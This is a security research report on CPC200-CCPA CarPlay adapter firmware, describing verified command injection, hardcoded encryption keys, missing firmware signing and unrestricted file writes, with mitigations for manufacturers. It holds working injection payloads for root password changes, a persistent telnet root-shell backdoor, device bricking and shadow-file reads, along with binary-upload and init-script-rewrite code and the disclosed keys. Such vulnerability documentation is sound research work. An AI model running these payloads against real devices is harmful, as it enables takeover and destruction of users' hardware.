# CPC200-CCPA Security Vulnerabilities

**Purpose:** Security findings from reverse engineering
**Classification:** Research documentation (authorized security analysis)
**Last Updated:** 2026-01-19 (Live testing verification added)

---

## Summary of Findings

| Category | Severity | Description |
|----------|----------|-------------|
| **Command Injection** | **CRITICAL** | Shell injection via BoxSettings fields (wifiName, btName, oemIconLabel) - **VERIFIED** |
| Hardcoded Keys | HIGH | USB and firmware encryption use hardcoded keys |
| No Firmware Signing | HIGH | Custom firmware accepted without verification |
| File Upload | HIGH | Arbitrary file write via SendFile (no path validation) - **VERIFIED** |
| Binary Upload | HIGH | Executables can be uploaded and installed via SendFile + injection - **VERIFIED** |
| Init Script Modification | HIGH | /etc/init.d/rcS writable, enables persistent backdoors - **VERIFIED** |
| Shell Execution | HIGH | popen() used with user-controlled parameters |
| Debug Commands | MEDIUM | Debug mode exposes log files |
| Connection Timeout | LOW | Predictable timeout values enable DoS |
| Expired Certificates | LOW | MFi certificate expired but functional |
| Custom Init Hook | INFO | `/script/custom_init.sh` executes on boot if present |

---

## 0. Command Injection via BoxSettings (CRITICAL) - Binary Verified Jan 2026

### Finding

The firmware uses `popen()` and `/bin/sh` to execute shell commands with **user-controlled input** from BoxSettings JSON fields. No input sanitization is performed.

### Vulnerable Code Paths (Binary Evidence)

**WiFi SSID Configuration:**
```c
grep "ssid=%s" /etc/hostapd.conf || sed -i "s/^ssid=.*/ssid=%s/" /etc/hostapd.conf
```
- **Input:** `wifiName` from BoxSettings JSON
- **Injection:** `wifiName: "test\"; cat /etc/passwd > /tmp/pwned; echo \""`

**Bluetooth Name Configuration:**
```c
sed -i "s/name .*;/name \"%s\";/" /etc/bluetooth/hcid.conf
```
- **Input:** `btName` from BoxSettings JSON
- **Injection:** `btName: "test\"; id > /tmp/pwned; echo \""`

**OEM Icon Label:**
```c
grep "oemIconLabel = %s$" %s || sed -i "s/^.*oemIconLabel = .*/oemIconLabel = %s/" %s
```
- **Input:** `oemIconLabel` from BoxSettings or carlogo config
- **Injection:** Similar to above

### Shell Commands Executed by Firmware

The binary contains 50+ hardcoded shell commands executed via `popen()`:

| Command Pattern | Trigger | User Input? |
|-----------------|---------|-------------|
| `sed -i "s/ssid=.*/ssid=%s/"` | BoxSettings wifiName | **YES** |
| `sed -i "s/name .*/name \"%s\"/"` | BoxSettings btName | **YES** |
| `killall AppleCarPlay; AppleCarPlay --width %d --height %d --fps %d` | Open message | Integers only |
| `tar -xvf %s -C /tmp` | hwfs.tar.gz upload | Path only |
| `/script/phone_link_deamon.sh %s start` | Phone connection | Hardcoded values |
| `echo -n %s > /etc/box_product_type` | BoxSettings | **Possibly** |

### Impact

- **Root shell access** - Firmware runs as root (only user on system)
- **Persistent backdoor** - Can write to `/script/custom_init.sh`
- **Configuration tampering** - Modify any config file
- **Denial of service** - Kill processes, corrupt filesystem

### Proof of Concept

**Basic command injection:**
```json
{
  "wifiName": "test$(id > /tmp/pwned)",
  "btName": "carlink"
}
```

**Sed escape injection (breaks out of sed command):**
```json
{
  "wifiName": "x\"; cat /etc/shadow > /tmp/shadow; echo \"y",
  "btName": "carlink"
}
```

### Arbitrary Command Execution Examples

**Execute riddleBoxCfg to enable AdvancedFeatures (immediate, no reboot):**
```json
{
  "wifiName": "a\"; /usr/sbin/riddleBoxCfg -s AdvancedFeatures 1; /usr/sbin/riddleBoxCfg --upConfig; echo \"",
  "btName": "carlink"
}
```

**What the firmware executes:**
```bash
sed -i "s/^ssid=.*/ssid=a"; /usr/sbin/riddleBoxCfg -s AdvancedFeatures 1; /usr/sbin/riddleBoxCfg --upConfig; echo "/" /etc/hostapd.conf
```

**Change root password:**
```json
{
  "wifiName": "a\"; echo 'root:newpassword' | chpasswd; echo \"",
  "btName": "carlink"
}
```

**Create persistent backdoor (runs on every boot):**
```json
{
  "wifiName": "a\"; echo '#!/bin/sh' > /script/custom_init.sh; echo 'telnetd -l /bin/sh' >> /script/custom_init.sh; chmod +x /script/custom_init.sh; echo \"",
  "btName": "carlink"
}
```

**Exfiltrate config to tmp (readable via debug commands):**
```json
{
  "wifiName": "a\"; cat /etc/riddle.conf > /tmp/exfil.txt; echo \"",
  "btName": "carlink"
}
```

### Why This Works

1. **No input validation** - BoxSettings JSON fields are used directly in popen()
2. **popen() with /bin/sh** - Shell interprets metacharacters (`"`, `;`, `$()`, etc.)
3. **Root execution** - All firmware processes run as root (only user on system)
4. **No sandboxing** - Full filesystem and command access

### Execution Model

| Method | Direct Message? | Via Injection? | Immediate? |
|--------|-----------------|----------------|------------|
| Run `riddleBoxCfg` | ❌ No message type | ✅ **YES** | ✅ Immediate |
| Run `passwd`/`chpasswd` | ❌ No message type | ✅ **YES** | ✅ Immediate |
| Execute any binary | ❌ No message type | ✅ **YES** | ✅ Immediate |
| Write to any file | ✅ SendFile (0x99) | ✅ Also via injection | ✅ Immediate |
| Reboot adapter | ✅ CloseDongle (0x15) | ✅ Also via injection | ✅ Immediate |

**Key insight:** While there is no "execute arbitrary command" message type, the command injection via BoxSettings provides equivalent capability. Any command that can be run in a shell can be executed immediately through the wifiName or btName fields.

### Practical Attack Scenarios

| Goal | Injection Payload |
|------|-------------------|
| Enable AdvancedFeatures | `a"; riddleBoxCfg -s AdvancedFeatures 1; riddleBoxCfg --upConfig; echo "` |
| Enable SSH/Telnet | `a"; dropbear; echo "` or `a"; telnetd -l /bin/sh; echo "` |
| Change WiFi password | `a"; riddleBoxCfg -s WifiPassword newpass123; echo "` |
| Disable heartbeat requirement | `a"; riddleBoxCfg -s SendHeartBeat 0; echo "` |
| Factory reset | `a"; rm -f /etc/riddle.conf; reboot; echo "` |
| Brick device | `a"; rm -rf /etc /script; echo "` |

### Live Testing Verification (Jan 2026)

All command injection payloads have been **verified working** on live hardware via USB connection.

#### Test 1: File Creation
```json
{"wifiName": "test\"; touch /tmp/pwned; echo \"", "btName": "carlink"}
```
**Result:** ✅ `/tmp/pwned` file created (verified via SSH)

#### Test 2: Password Change
```json
{"wifiName": "a\"; echo 'root:1234' | busybox chpasswd; echo \"", "btName": "carlink"}
```
**Result:** ✅ Root password changed to `1234`

**Note:** `chpasswd` symlink does not exist on adapter. Must use `busybox chpasswd` directly.

#### Test 3: Enable AdvancedFeatures
```json
{"wifiName": "a\"; /usr/sbin/riddleBoxCfg -s AdvancedFeatures 1; /usr/sbin/riddleBoxCfg --upConfig; echo \"", "btName": "carlink"}
```
**Result:** ✅ `AdvancedFeatures` set to `1` in `/etc/riddle.conf`

### Side Effects of Injection

**Important:** The injection payload breaks the sed command, so the WiFi SSID is **not** updated when using injection.

```bash
# Firmware intends to execute:
sed -i "s/^ssid=.*/ssid=WIFINAME/" /etc/hostapd.conf

# With injection, shell parses as:
sed -i "s/^ssid=.*/ssid=a"          # Fails (no file argument)
;                                    # Command separator
/usr/sbin/riddleBoxCfg -s ...       # Injection runs
;
echo "/" /etc/hostapd.conf          # Just prints strings
```

### Workaround: Send BoxSettings Twice

To execute injection AND set proper WiFi name:

1. **First BoxSettings:** Contains injection payload in `wifiName`
2. **Second BoxSettings:** Contains normal `wifiName` value

```typescript
// In host app initialization:
messages.push(new SendBoxSettings(cfg, null, injectionPayload)) // Injection
messages.push(new SendBoxSettings(cfg))                          // Normal config
```

This allows the injection to execute, then the second message properly configures the WiFi SSID.

### Busybox Applet Availability

Many busybox applets lack symlinks. Use `busybox <applet>` syntax:

| Applet | Symlink Exists | Direct Call |
|--------|----------------|-------------|
| `chpasswd` | ❌ No | `busybox chpasswd` |
| `passwd` | ✅ Yes | `passwd` or `busybox passwd` |
| `telnetd` | ✅ Yes | `telnetd` |
| `dropbear` | ❌ No | `busybox dropbear` (if compiled in) |

Verify available applets: `busybox --list`

### Mitigations Required

1. **Sanitize all user inputs** - Strip or escape shell metacharacters (`"`, `;`, `$`, `` ` ``, `|`, `&`, etc.)
2. **Use `execv()` instead of `popen()`** - Avoid shell interpretation entirely
3. **Input whitelisting** - Allow only alphanumeric + limited characters for names
4. **Principle of least privilege** - Don't run as root
5. **Input length limits** - Prevent excessively long injection payloads

---

## 1. Hardcoded Encryption Keys

### USB Encryption Key

| Item | Value |
|------|-------|
| **Key** | `W2EC1X1NbZ58TXtn` |
| **Algorithm** | AES-128-CTR |
| **Impact** | All adapters share the same key |

**Location:** Embedded in ARMadb-driver binary

**Risk:** USB traffic can be decrypted by any party with the key.

### Firmware Encryption Key (A15W)

| Item | Value |
|------|-------|
| **Key** | `AutoPlay9uPT4n17` |
| **Algorithm** | AES-128-CBC |
| **Impact** | Firmware can be decrypted and modified |

**Location:** ARMimg_maker binary (strings extraction)

**Risk:** Custom/malicious firmware can be created and deployed.

---

## 2. No Firmware Signature Verification

### Finding

The firmware update process:
1. Decrypts `.img` file using hardcoded key
2. Extracts tar.gz contents
3. Runs `once.sh` from extracted content
4. Copies files to rootfs
5. **No signature verification at any step**

### Impact

Anyone can create custom firmware:
1. Decrypt official firmware
2. Modify contents (add backdoor, change behavior)
3. Re-encrypt with known key
4. Deploy via USB drive or OTA

---

## 3. Arbitrary File Write (SendFile 0x99) - Binary Verified Jan 2026

### Protocol

```
Message Type: 0x99 (SendFile)
Payload:
  - 4 bytes: path length
  - N bytes: file path (null-terminated)
  - 4 bytes: content length
  - M bytes: file content
```

### Path Restrictions: NONE (Binary Verified)

**Critical Finding:** SendFile has **no path validation**. The only restrictions are filesystem-level.

| Check | Status | Evidence |
|-------|--------|----------|
| Path whitelist | ❌ None | No `strncmp("/tmp/")` or prefix validation |
| Path traversal filter | ❌ None | No `../` sanitization |
| File extension filter | ❌ None | Any extension accepted |
| Size limit | ⚠️ Exists | `UPLOAD FILE Length Error!!!` (limit unknown) |

### Filesystem Writability (SSH/Telnet Verified)

| Path | Writable | Notes |
|------|----------|-------|
| `/tmp/*` | ✅ Yes | tmpfs (RAM-backed, ~50-80MB) |
| `/etc/*` | ✅ Yes | **Not read-only squashfs** - persistent flash |
| `/script/*` | ✅ Yes | Startup scripts |
| `/usr/*` | ⚠️ Maybe | Depends on flash partition |
| `/mnt/UPAN/*` | ✅ Yes | USB drive mount point |

**Binary Evidence of /etc writability:**
```bash
cp /tmp/carlogo.png /etc/boa/images/carlogo.png    # Logo copy
cp /etc/riddle_default.conf /etc/riddle.conf       # Config copy
rm -f /etc/riddle.conf                             # Config delete
echo -n %s > /etc/box_product_type                 # Direct write
sed -i "s/..." /etc/bluetooth/hcid.conf            # Config modify
```

### Risk Areas

| Path | Risk | Impact |
|------|------|--------|
| `/tmp/*` | Temporary files, scripts | Session-only persistence |
| `/etc/*` | Configuration files | **Persistent across reboots** |
| `/script/*` | Startup scripts | **Boot-time code execution** |
| `/tmp/hwfs.tar.gz` | Archive auto-extraction | Multi-file deployment |
| `/tmp/*Update.img` | Firmware trigger | Full firmware replacement |

### Example Payloads

```
/tmp/screen_dpi        # Legitimate use
/tmp/night_mode        # Legitimate use
/etc/riddle.conf       # Configuration override (PERSISTENT)
/script/custom_init.sh # Script injection (EXECUTES ON BOOT)
/tmp/hwfs.tar.gz       # Archive auto-extraction to /tmp
```

### Binary Upload Capability (Live Tested Jan 2026)

**SendFile can upload executable binaries** to the adapter, enabling installation of additional tools or replacement of existing binaries.

#### System Constraints

| Constraint | Value | Notes |
|------------|-------|-------|
| Architecture | armv7l | ARM 32-bit, binaries must be cross-compiled |
| /tmp free space | ~52 MB | RAM-backed tmpfs |
| /etc writable | ✅ Yes | Persistent flash storage |
| /usr/sbin writable | ✅ Yes | System binaries |
| SendFile size limit | Unknown | `UPLOAD FILE Length Error!!!` at some threshold |

#### Example: Upload and Install Binary

```kotlin
// 1. Send binary to /tmp (always writable)
val binaryData = File("/path/to/armv7l_binary").readBytes()
sendFile("/tmp/mybinary", binaryData)

// 2. Use injection to move to final location and make executable
val injection = "a\"; mv /tmp/mybinary /usr/sbin/mybinary; chmod +x /usr/sbin/mybinary; echo \""
sendBoxSettings(wifiName = injection)
```

#### Example: Modify Init Script (rcS)

```kotlin
// Option 1: Use injection with sed to uncomment dropbear
val injection = "a\"; sed -i 's/#dropbear/dropbear/' /etc/init.d/rcS; echo \""

// Option 2: Send entire modified rcS file directly
val modifiedRcS = """
#!/bin/sh
. /etc/profile
dropbear
/bin/busybox telnetd -l /bin/sh -p 23 &
# ... rest of init script ...
""".toByteArray()
sendFile("/etc/init.d/rcS", modifiedRcS)
```

#### Large File Transfer

For files exceeding SendFile limit, use chunking:

```kotlin
// Send chunks
sendFile("/tmp/bin_part1", chunk1)
sendFile("/tmp/bin_part2", chunk2)
sendFile("/tmp/bin_part3", chunk3)

// Reassemble via injection
val injection = "a\"; cat /tmp/bin_part* > /usr/sbin/target; chmod +x /usr/sbin/target; rm /tmp/bin_part*; echo \""
```

#### Alternative: tar.gz Auto-Extraction

Files sent to `/tmp/hwfs.tar.gz` are **automatically extracted** by firmware:

```kotlin
// Create tar.gz with desired files
// firmware executes: tar -xvf /tmp/hwfs.tar.gz -C /tmp
sendFile("/tmp/hwfs.tar.gz", tarGzContent)
```

---

## 4. Debug Commands (CMD_DEBUG_TEST)

### Message Type: 0x88

| Value | Action |
|-------|--------|
| 1 | Open `/tmp/userspace.log`, run `/script/open_log.sh` |
| 2 | Read log file, send contents to host |
| 3 | Enable persistent debug mode flag |

### Risk

Debug mode may expose:
- System logs with sensitive information
- Connection details
- Internal state information

---

## 5. Expired MFi Certificate

### Certificate Details

| Property | Value |
|----------|-------|
| **Validity** | 2007-2015 (expired) |
| **Status** | Still functional |
| **Type** | Self-signed |

### Additional Findings

| Path | Content |
|------|---------|
| `/var/lib/lockdown/common.cert` | Auth certificates (plaintext plist) |
| `/var/lib/lockdown/root_key.pem` | RSA private key (2048-bit, plaintext) |

### Risk

- No certificate revocation checking
- Self-signed certificates with absurd validity (year 3911-3921 observed)
- Private keys stored without protection

---

## 6. System Calls with Format Strings

### Locations in Firmware

| Address | Trigger | Concern |
|---------|---------|---------|
| 0x1c0e4 | param_2 == 0x66 | Unknown command |
| 0x1c0f4 | param_2 == 0 | State transition |
| 0x1c108 | param_2 == 1 | Format string with USB params |

### Risk

Potential format string vulnerability if user-controlled data reaches these calls.

---

## 7. D-Bus Interface Exposure

### Service: org.riddle

If SSH/serial access is available:

```bash
dbus-send --system --dest=org.riddle /RiddleBluetoothService \
  org.riddle.BluetoothControl.AutoConnect
```

### Available Interfaces

- `org.riddle.BluetoothControl`
- `org.riddle.HUDCommand`
- `org.riddle.AudioSignal`

---

## 8. Weak WiFi Configuration

### Default Settings

| Parameter | Value |
|-----------|-------|
| **Password** | 8-character default |
| **WPA Mode** | WPA2-PSK |

### Risk

Short default passwords may be brute-forced if not changed.

---

## 9. Connection Timeout Mechanism (DoS Vector)

### Timeout Constants (from binary at 0x21112)

| Timeout | Value | Hex | Effect |
|---------|-------|-----|--------|
| **Host No Response** | 15,000 ms | `0x3a98` | Connection reset |
| **Send to Host** | 4,500 ms | `0x1194` | Connection reset |

### Firmware Behavior

The firmware implements a connection supervision watchdog:
- If no heartbeat (0xAA) received within **15 seconds**, logs: `"Host No Response, we will reset connection!!!"`
- If USB send fails for **4.5 seconds**, logs: `"Send to Host timeout, we will reset connection!!!"`
- Connection is forcibly reset in both cases

### DoS Risk

An attacker with USB access could:
1. Send initial connection messages to establish session
2. Stop sending heartbeats
3. Firmware resets connection after 15 seconds
4. Repeat - keeping adapter in reconnection loop

### Mitigation

The timeout values are **hardcoded** in the firmware binary and cannot be changed via configuration.

---

## 10. Custom Init Hook Persistence

### Finding

The firmware executes `/script/custom_init.sh` during boot if the file exists:

```bash
# From start_main_service.sh
test -e /script/custom_init.sh && /script/custom_init.sh
```

### Risk

If an attacker gains write access (via SendFile 0x99 or firmware modification):
1. Create `/script/custom_init.sh` with malicious content
2. Script executes automatically on every boot
3. Persistence achieved without firmware modification

### Legitimate Use

This hook is intended for:
- Enabling dropbear/SSH
- Custom configuration
- Development purposes

---

## Attack Vectors Summary

### Local (USB Access Required)

1. **Firmware Replacement**
   - Decrypt → Modify → Re-encrypt → Deploy
   - No authentication required

2. **File Injection**
   - Use SendFile (0x99) to write arbitrary files
   - Can modify configuration or inject scripts

3. **Debug Mode**
   - Enable logging via CMD_DEBUG_TEST
   - Extract log files

### Remote (WiFi Access Required)

1. **Traffic Decryption**
   - USB encryption uses known key
   - Can intercept and decrypt USB traffic

2. **Configuration Override**
   - Send malicious BoxSettings JSON
   - May affect adapter behavior

---

## Mitigations

### For Researchers

1. Use in isolated network environment
2. Monitor adapter traffic for anomalies
3. Reset to factory defaults after testing

### For Manufacturers

1. Use unique per-device encryption keys
2. Implement firmware signature verification
3. Encrypt private keys at rest
4. Validate all file paths in SendFile handler
5. Remove or protect debug commands in production

---

## Disclosure Status

This documentation is for authorized security research purposes in the context of:
- Understanding CarPlay/Android Auto adapter internals
- Developing compatible open-source implementations
- Educational documentation of embedded device security

---

## References

- Source: `GM_research/cpc200_research/docs/analysis/ANALYSIS_UPDATE_2025_01_15.md`
- Source: `pi-carplay-4.1.3/firmware_binaries/PROTOCOL_ANALYSIS.md`
- Binary analysis using Ghidra 12.0, radare2
